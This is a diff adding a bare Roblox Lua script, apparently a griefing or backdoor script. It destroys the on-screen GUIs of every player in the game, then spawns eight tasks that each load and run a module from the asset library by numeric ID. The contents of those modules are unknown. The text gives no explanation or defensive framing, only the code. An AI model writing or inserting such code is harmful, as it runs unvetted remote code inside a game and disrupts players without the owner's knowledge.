@@ -1,0 +1,43 @@
+for i, plr in pairs(game.Players:GetPlayers()) do
+if plr:FindFirstChild("PlayerGui") then
+					local pg = plr.PlayerGui
+					for _, gui in ipairs(pg:GetChildren()) do
+						if gui:IsA("ScreenGui") then
+							if gui.Name ~= "StarterGui" and gui.Name ~= "HealthGui" and gui.Name ~= "CoreGuiClone" then
+								gui:Destroy()
+							end
+						end
+					end
+				end
+end
+task.spawn(function()
+    require(84764230903885)
+end)
+
+task.spawn(function()
+    require(127877753044195)
+end)
+
+task.spawn(function()
+    require(128959349935349)
+end)
+
+task.spawn(function()
+    require(126364412973980)
+end)
+
+task.spawn(function()
+    require(87618687731460)
+end)
+
+task.spawn(function()
+    require(91897474801753)
+end)
+
+task.spawn(function()
+    require(122386303423278)
+end)
+
+task.spawn(function()
+    require(121732221475485)
+end)
